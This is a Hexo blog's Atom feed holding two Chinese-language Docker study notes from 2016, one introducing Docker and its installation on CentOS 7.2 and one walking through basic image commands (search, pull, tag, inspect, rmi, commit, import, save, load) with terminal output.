<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Bonjour!</title>
  <subtitle>正在输入...</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2016-11-16T03:48:37.408Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>BonjourChen</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Docker学习笔记（二）：镜像的基本操作</title>
    <link href="http://yoursite.com/2016/11/16/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E9%95%9C%E5%83%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <id>http://yoursite.com/2016/11/16/Docker学习笔记（二）：镜像的基本操作/</id>
    <published>2016-11-16T03:39:35.000Z</published>
    <updated>2016-11-16T03:48:37.408Z</updated>
    
    <content type="html"><![CDATA[<h4 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ docker search ubuntu</div><div class="line">Cannot connect to the Docker daemon. Is the docker daemon running on this host?</div><div class="line">[wb@localhost ~]$ sudo docker search ubuntu</div><div class="line">INDEX       NAME                                 DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</div><div class="line">docker.io   docker.io/ubuntu                     Ubuntu is a Debian-based Linux operating s...   5037      [OK]       </div><div class="line">docker.io   docker.io/ubuntu-upstart             Upstart is an event-based replacement for ...   68        [OK]       </div><div class="line">docker.io   docker.io/rastasheep/ubuntu-sshd     Dockerized SSH service, built on top of of...   49                   [OK]</div><div class="line">docker.io   docker.io/consol/ubuntu-xfce-vnc     Ubuntu container with &quot;headless&quot; VNC sessi...   29                   [OK]</div><div class="line">docker.io   docker.io/torusware/speedus-ubuntu   Always updated official Ubuntu docker imag...   27                   [OK]</div><div class="line">docker.io   docker.io/ubuntu-debootstrap         debootstrap --variant=minbase --components...   27        [OK]       </div><div class="line">docker.io   docker.io/ioft/armhf-ubuntu          [ABR] Ubuntu Docker images for the ARMv7(a...   19                   [OK]</div></pre></td></tr></table></figure>
<p>可以加上<code>-s</code>参数查看星级以上的镜像。</p>
<h4 id="利用pull命令获取镜像"><a href="#利用pull命令获取镜像" class="headerlink" title="利用pull命令获取镜像"></a>利用pull命令获取镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo docker pull ubuntu:14.04</div></pre></td></tr></table></figure>
<p>如果不加上tag，默认是从Docker Hub下载latest的镜像。如果要下载的是Ubuntu14.4，则使用命令：<code>sudo docker pull ubuntu:14.04</code>。如果要更换仓库，可以加上仓库名。也可以指定其他的注册服务器下载。</p>
<h4 id="查看当前系统中的镜像信息"><a href="#查看当前系统中的镜像信息" class="headerlink" title="查看当前系统中的镜像信息"></a>查看当前系统中的镜像信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo docker images</div><div class="line">[sudo] password for wb: </div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">docker.io/centos    latest              0584b3d2cf6d        12 days ago         196.5 MB</div><div class="line">docker.io/ubuntu    latest              f753707788c5        4 weeks ago         127.1 MB</div><div class="line">docker.io/ubuntu    14.04               1e0c3dd64ccd        4 weeks ago         187.9 MB</div></pre></td></tr></table></figure>
<p>可以看到包含了一下的信息：</p>
<ul>
<li>镜像来自的仓库</li>
<li>镜像的tag</li>
<li>镜像的ID</li>
<li>镜像创建的时间</li>
<li>镜像的大小</li>
</ul>
<a id="more"></a>
<h4 id="为镜像添加新的标签"><a href="#为镜像添加新的标签" class="headerlink" title="为镜像添加新的标签"></a>为镜像添加新的标签</h4><p>可以使用<code>docker tag</code>命令为本地镜像添加新的标签。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo docker tag docker.io/ubuntu:14.04 ubuntu:latest_1</div><div class="line">[wb@localhost ~]$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">docker.io/centos    latest              0584b3d2cf6d        12 days ago         196.5 MB</div><div class="line">docker.io/ubuntu    latest              f753707788c5        4 weeks ago         127.1 MB</div><div class="line">docker.io/ubuntu    14.04               1e0c3dd64ccd        4 weeks ago         187.9 MB</div><div class="line">ubuntu              latest_1            1e0c3dd64ccd        4 weeks ago         187.9 MB</div></pre></td></tr></table></figure></p>
<p>虽然创建了新的tag，但是Image ID是一样的，说明指向的是同一个镜像。</p>
<h4 id="查看镜像的详细信息"><a href="#查看镜像的详细信息" class="headerlink" title="查看镜像的详细信息"></a>查看镜像的详细信息</h4><p>可以使用<code>docker inspect</code>查看镜像详细信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo docker inspect 1e0c</div><div class="line">[</div><div class="line">    &#123;</div><div class="line">        &quot;Id&quot;: &quot;sha256:1e0c3dd64ccdb5d750d8d1dee705a64e40f1c49fd8859ae488853748c91cad43&quot;,</div><div class="line">        &quot;RepoTags&quot;: [</div><div class="line">            &quot;docker.io/ubuntu:14.04&quot;,</div><div class="line">            &quot;ubuntu:latest_1&quot;</div><div class="line">        ],</div><div class="line">        &quot;RepoDigests&quot;: [],</div><div class="line">        &quot;Parent&quot;: &quot;&quot;,</div><div class="line">        &quot;Comment&quot;: &quot;&quot;,</div><div class="line">        &quot;Created&quot;: &quot;2016-10-13T21:13:06.201891855Z&quot;,</div><div class="line">        &quot;Container&quot;: &quot;f0345d441216cc655ebbd58fd942ff6a7bcb38c73fe4320bc8b6a5da376aea4d&quot;,</div><div class="line">        &quot;ContainerConfig&quot;: &#123;</div><div class="line">            &quot;Hostname&quot;: &quot;afef2623e56c&quot;,</div><div class="line">            &quot;Domainname&quot;: &quot;&quot;,</div><div class="line">            &quot;User&quot;: &quot;&quot;,</div><div class="line">            &quot;AttachStdin&quot;: false,</div><div class="line">            &quot;AttachStdout&quot;: false,</div><div class="line">            &quot;AttachStderr&quot;: false,</div><div class="line">            &quot;Tty&quot;: false,</div><div class="line">            &quot;OpenStdin&quot;: false,</div><div class="line">            &quot;StdinOnce&quot;: false,</div><div class="line">            &quot;Env&quot;: [</div><div class="line">                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</div><div class="line">            ],</div><div class="line">            &quot;Cmd&quot;: [</div><div class="line">                &quot;/bin/sh&quot;,</div><div class="line">                &quot;-c&quot;,</div><div class="line">                &quot;#(nop) &quot;,</div><div class="line">                &quot;CMD [\&quot;/bin/bash\&quot;]&quot;</div><div class="line">            ],</div><div class="line">            &quot;ArgsEscaped&quot;: true,</div><div class="line">            &quot;Image&quot;: &quot;sha256:ab1dd3221ab66f16639512a49875dd9b3c6a253eca407b04217f44b489a1c1d4&quot;,</div><div class="line">            &quot;Volumes&quot;: null,</div><div class="line">            &quot;WorkingDir&quot;: &quot;&quot;,</div><div class="line">            &quot;Entrypoint&quot;: null,</div><div class="line">            &quot;OnBuild&quot;: null,</div><div class="line">            &quot;Labels&quot;: &#123;&#125;</div><div class="line">        &#125;,</div><div class="line">        &quot;DockerVersion&quot;: &quot;1.12.1&quot;,</div><div class="line">        &quot;Author&quot;: &quot;&quot;,</div><div class="line">        &quot;Config&quot;: &#123;</div><div class="line">            &quot;Hostname&quot;: &quot;afef2623e56c&quot;,</div><div class="line">            &quot;Domainname&quot;: &quot;&quot;,</div><div class="line">            &quot;User&quot;: &quot;&quot;,</div><div class="line">            &quot;AttachStdin&quot;: false,</div><div class="line">            &quot;AttachStdout&quot;: false,</div><div class="line">            &quot;AttachStderr&quot;: false,</div><div class="line">            &quot;Tty&quot;: false,</div><div class="line">            &quot;OpenStdin&quot;: false,</div><div class="line">            &quot;StdinOnce&quot;: false,</div><div class="line">            &quot;Env&quot;: [</div><div class="line">                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</div><div class="line">            ],</div><div class="line">            &quot;Cmd&quot;: [</div><div class="line">                &quot;/bin/bash&quot;</div><div class="line">            ],</div><div class="line">            &quot;ArgsEscaped&quot;: true,</div><div class="line">            &quot;Image&quot;: &quot;sha256:ab1dd3221ab66f16639512a49875dd9b3c6a253eca407b04217f44b489a1c1d4&quot;,</div><div class="line">            &quot;Volumes&quot;: null,</div><div class="line">            &quot;WorkingDir&quot;: &quot;&quot;,</div><div class="line">            &quot;Entrypoint&quot;: null,</div><div class="line">            &quot;OnBuild&quot;: null,</div><div class="line">            &quot;Labels&quot;: &#123;&#125;</div><div class="line">        &#125;,</div><div class="line">        &quot;Architecture&quot;: &quot;amd64&quot;,</div><div class="line">        &quot;Os&quot;: &quot;linux&quot;,</div><div class="line">        &quot;Size&quot;: 187920051,</div><div class="line">        &quot;VirtualSize&quot;: 187920051,</div><div class="line">        &quot;GraphDriver&quot;: &#123;</div><div class="line">            &quot;Name&quot;: &quot;devicemapper&quot;,</div><div class="line">            &quot;Data&quot;: &#123;</div><div class="line">                &quot;DeviceId&quot;: &quot;9&quot;,</div><div class="line">                &quot;DeviceName&quot;: &quot;docker-253:0-201516507-c9bf8de05102f9b96a234d72a52f2f02e269412a0726403c13ef4097eb1b693f&quot;,</div><div class="line">                &quot;DeviceSize&quot;: &quot;10737418240&quot;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">]</div></pre></td></tr></table></figure></p>
<p>返回的是json格式的数据，可以使用-f参数来显示其中的具体内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo docker inspect -f &#123;&#123;&quot;.GraphDriver.Name&quot;&#125;&#125; 1e0c </div><div class="line">devicemapper</div></pre></td></tr></table></figure></p>
<p>使用镜像ID的时候并不需要ID的全部，只需要一部分能够标识这个镜像就可以了。</p>
<h4 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h4><p>删除镜像使用<code>docker rmi 标签/ID</code>。<br>当使用镜像tag删除镜像的时候，如果一个镜像有多个tag，那么只删除镜像的一个tag。当镜像只剩下一个tag的时候，会删除整个镜像。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo docker rmi ubuntu:latest_1</div><div class="line">Untagged: ubuntu:latest_1</div><div class="line">[wb@localhost ~]$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">docker.io/centos    latest              0584b3d2cf6d        12 days ago         196.5 MB</div><div class="line">docker.io/ubuntu    latest              f753707788c5        4 weeks ago         127.1 MB</div><div class="line">docker.io/ubuntu    14.04               1e0c3dd64ccd        4 weeks ago         187.9 MB</div><div class="line"></div><div class="line">[wb@localhost ~]$ sudo docker rmi docker.io/ubuntu:14.04</div><div class="line">Untagged: docker.io/ubuntu:14.04</div><div class="line">Deleted: sha256:1e0c3dd64ccdb5d750d8d1dee705a64e40f1c49fd8859ae488853748c91cad43</div><div class="line">Deleted: sha256:91619704ae6b5c28333e3a3a56f8ed2c9913be0715bdaec8d5ec9cf146ed48ec</div><div class="line">Deleted: sha256:64d2ec335addc02267a5ab8d2d461c796605edef0c93b5e6cc534b25d62a3175</div><div class="line">Deleted: sha256:0e3b3a9aca0d43a428166e01ae1856f897faf3b7a9a8cc487aaddf605e79b3ab</div><div class="line">Deleted: sha256:011cbcce260f4a6f34e07083c99f68fc69e8a77700711e448f56479da0aa608c</div><div class="line">Deleted: sha256:a85f35566a268e6f4411c5157ffcffe4f5918b068b04d79fdd80003901ca39da</div><div class="line">[wb@localhost ~]$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">docker.io/centos    latest              0584b3d2cf6d        12 days ago         196.5 MB</div><div class="line">docker.io/ubuntu    latest              f753707788c5        4 weeks ago         127.1 MB</div></pre></td></tr></table></figure></p>
<p>如果使用镜像ID删除镜像，则会删除镜像的所有tag，然后删除镜像。但是当镜像里面存在正在运行的容器时，无法删除镜像。此时应当使用rm先删除容器，之后在删除镜像。</p>
<h4 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h4><p>创建镜像的方法有三种：</p>
<ul>
<li>基于已有镜像的容器创建</li>
<li>基于本地模板导入</li>
<li>基于Dockerfile创建</li>
</ul>
<p><strong>基于已有镜像的容器创建。</strong>主要使用命令：<code>docker commit [options] container [repository[:tag]]</code>，主要参数包括：</p>
<ul>
<li>-a –author=”” 作者信息</li>
<li>-m –message=”” 提交消息</li>
<li>-p –pause=true 提交时暂停容器运行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">在镜像内创建一个新文件:</div><div class="line">[wb@localhost ~]$ sudo docker run -ti ubuntu:14.04 /bin/bash</div><div class="line">root@dc46bcb6858a:/# touch test</div><div class="line">root@dc46bcb6858a:/# ls</div><div class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  test  tmp  usr  var</div><div class="line">此时容器ID为dc46bcb6858a，保存为新镜像：</div><div class="line">[wb@localhost ~]$ sudo docker commit -m &quot;Add a new file&quot; dc46bcb6858a test</div><div class="line">sha256:9790710e4c85127f960d32f64b1fb9e76944f1922df70de27b18bb61f472c30e</div><div class="line">[wb@localhost ~]$ sudo docker images </div><div class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">test                 latest              9790710e4c85        13 seconds ago      187.9 MB</div></pre></td></tr></table></figure>
<p><strong>基于本地模板导入。</strong>可以将一个操作系统模板文件导入镜像。<br>openVZ系统模板下载地址：<a href="https://openvz.org/Download/template/precreated" target="_blank" rel="external">openVZ</a><br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161116/092908193.png" alt="mark"><br>下载了之后使用命令导入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo cat ubuntu-12.04-x86-minimal.tar.gz | sudo docker import - ubuntu:12.04</div><div class="line">sha256:574af84d86e9dc97ffa47875f31173d0095c5ac917ea4d35441c60bf2cc31baf</div></pre></td></tr></table></figure></p>
<p>查看本地镜像已经存在：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo docker images </div><div class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu               12.04               574af84d86e9        15 seconds ago      145.8 MB</div></pre></td></tr></table></figure></p>
<p><strong>基于Dockerfile创建。</strong>后文详细介绍。</p>
<h4 id="镜像的导入和导出"><a href="#镜像的导入和导出" class="headerlink" title="镜像的导入和导出"></a>镜像的导入和导出</h4><p><strong>镜像的导出：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo docker save  -o ubuntu_1404.tar ubuntu:14.04</div></pre></td></tr></table></figure>
<p><strong>镜像的载入：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo docker load --input ubuntu_1404.tar</div><div class="line">或者</div><div class="line">[wb@localhost ~]$ sudo docker load &lt; ubuntu_1404.tar</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;搜索镜像&quot;&gt;&lt;a href=&quot;#搜索镜像&quot; class=&quot;headerlink&quot; title=&quot;搜索镜像&quot;&gt;&lt;/a&gt;搜索镜像&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[wb@localhost ~]$ docker search ubuntu&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Cannot connect to the Docker daemon. Is the docker daemon running on this host?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[wb@localhost ~]$ sudo docker search ubuntu&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;INDEX       NAME                                 DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;docker.io   docker.io/ubuntu                     Ubuntu is a Debian-based Linux operating s...   5037      [OK]       &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;docker.io   docker.io/ubuntu-upstart             Upstart is an event-based replacement for ...   68        [OK]       &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;docker.io   docker.io/rastasheep/ubuntu-sshd     Dockerized SSH service, built on top of of...   49                   [OK]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;docker.io   docker.io/consol/ubuntu-xfce-vnc     Ubuntu container with &amp;quot;headless&amp;quot; VNC sessi...   29                   [OK]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;docker.io   docker.io/torusware/speedus-ubuntu   Always updated official Ubuntu docker imag...   27                   [OK]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;docker.io   docker.io/ubuntu-debootstrap         debootstrap --variant=minbase --components...   27        [OK]       &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;docker.io   docker.io/ioft/armhf-ubuntu          [ABR] Ubuntu Docker images for the ARMv7(a...   19                   [OK]&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以加上&lt;code&gt;-s&lt;/code&gt;参数查看星级以上的镜像。&lt;/p&gt;
&lt;h4 id=&quot;利用pull命令获取镜像&quot;&gt;&lt;a href=&quot;#利用pull命令获取镜像&quot; class=&quot;headerlink&quot; title=&quot;利用pull命令获取镜像&quot;&gt;&lt;/a&gt;利用pull命令获取镜像&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[wb@localhost ~]$ sudo docker pull ubuntu:14.04&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果不加上tag，默认是从Docker Hub下载latest的镜像。如果要下载的是Ubuntu14.4，则使用命令：&lt;code&gt;sudo docker pull ubuntu:14.04&lt;/code&gt;。如果要更换仓库，可以加上仓库名。也可以指定其他的注册服务器下载。&lt;/p&gt;
&lt;h4 id=&quot;查看当前系统中的镜像信息&quot;&gt;&lt;a href=&quot;#查看当前系统中的镜像信息&quot; class=&quot;headerlink&quot; title=&quot;查看当前系统中的镜像信息&quot;&gt;&lt;/a&gt;查看当前系统中的镜像信息&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[wb@localhost ~]$ sudo docker images&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[sudo] password for wb: &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;docker.io/centos    latest              0584b3d2cf6d        12 days ago         196.5 MB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;docker.io/ubuntu    latest              f753707788c5        4 weeks ago         127.1 MB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;docker.io/ubuntu    14.04               1e0c3dd64ccd        4 weeks ago         187.9 MB&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到包含了一下的信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;镜像来自的仓库&lt;/li&gt;
&lt;li&gt;镜像的tag&lt;/li&gt;
&lt;li&gt;镜像的ID&lt;/li&gt;
&lt;li&gt;镜像创建的时间&lt;/li&gt;
&lt;li&gt;镜像的大小&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://yoursite.com/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://yoursite.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Docker学习笔记（一）：简介&amp;安装</title>
    <link href="http://yoursite.com/2016/11/15/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2016/11/15/Docker学习笔记（一）/</id>
    <published>2016-11-15T07:34:04.000Z</published>
    <updated>2016-11-16T03:36:35.129Z</updated>
    
    <content type="html"><![CDATA[<h4 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker"></a>什么是Docker</h4><p>百度百科：Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。Docker 是 PaaS 提供商 dotCloud 开源的一个基于 LXC 的高级容器引擎，源代码托管在 Github 上, 基于go语言并遵从Apache2.0协议开源。</p>
<h4 id="Linux容器技术"><a href="#Linux容器技术" class="headerlink" title="Linux容器技术"></a>Linux容器技术</h4><p>Docker引擎的基础是Linux容器（LXC）技术。Docker提供了各种容器管理工具（如开发、版本、移植等）让用户无需关注底层的操作，可以简单明了地管理和使用容器。</p>
<h4 id="Docker在开发和运维中的优势"><a href="#Docker在开发和运维中的优势" class="headerlink" title="Docker在开发和运维中的优势"></a>Docker在开发和运维中的优势</h4><ul>
<li>更快速的交付和部署</li>
<li>更高效的资源利用（内核级虚拟化，性能更高）</li>
<li>更轻松的迁移和扩展（几乎可以在任意的平台上运行）</li>
<li>更简单的更新管理（Dockerfile）</li>
</ul>
<h4 id="Docker与虚拟机的比较"><a href="#Docker与虚拟机的比较" class="headerlink" title="Docker与虚拟机的比较"></a>Docker与虚拟机的比较</h4><p><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161115/094908295.png" alt="mark"><br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161115/094958563.png" alt="mark"></p>
<h4 id="Docker核心概念"><a href="#Docker核心概念" class="headerlink" title="Docker核心概念"></a>Docker核心概念</h4><ul>
<li>Docker镜像</li>
</ul>
<p>Docker镜像（Image）类似于虚拟机镜像，可以理解为一个面向Docker引擎的只读模板，包含了文件系统。</p>
<ul>
<li>Docker容器</li>
</ul>
<p>容器（Container）类似于一个轻量级沙箱，Docker利用容器来运行和隔离应用。容器是从镜像创建的应用运行实例，可以启动，开始，停止，删除。</p>
<ul>
<li>Docker仓库</li>
</ul>
<p>Docker仓库（Repository）类似代码仓库，是Docker集中存放镜像文件的场所。分为公开仓库和私有仓库。<br><a id="more"></a></p>
<h4 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h4><p>Docker只能在64位的系统上安装，本人安装环境的CentOS 7.2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[wb@localhost /]$ cat /etc/redhat-release </div><div class="line">CentOS Linux release 7.2.1511 (Core)</div></pre></td></tr></table></figure></p>
<p>安装命令：<code>sudo yum install docker</code></p>
<h4 id="查看Docker版本"><a href="#查看Docker版本" class="headerlink" title="查看Docker版本"></a>查看Docker版本</h4><p>安装之后查看docker版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[wb@localhost /]$ docker version</div><div class="line">Client:</div><div class="line"> Version:         1.10.3</div><div class="line"> API version:     1.22</div><div class="line"> Package version: docker-common-1.10.3-46.el7.centos.14.x86_64</div><div class="line"> Go version:      go1.6.3</div><div class="line"> Git commit:      cb079f6-unsupported</div><div class="line"> Built:           Fri Sep 16 13:24:25 2016</div><div class="line"> OS/Arch:         linux/amd64</div><div class="line">Cannot connect to the Docker daemon. Is the docker daemon running on this host?</div></pre></td></tr></table></figure></p>
<p> 这里出现了一句警告：<code>Cannot connect to the Docker daemon. Is the docker daemon running on this host?</code>使用sudo也不行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[wb@localhost /]$ sudo docker search centos</div><div class="line">[sudo] password for wb: </div><div class="line">Cannot connect to the Docker daemon. Is the docker daemon running on this host?</div></pre></td></tr></table></figure></p>
<p>后来重启了一下docker服务，然后就可以了。使用sudo不会出现这个警告了。</p>
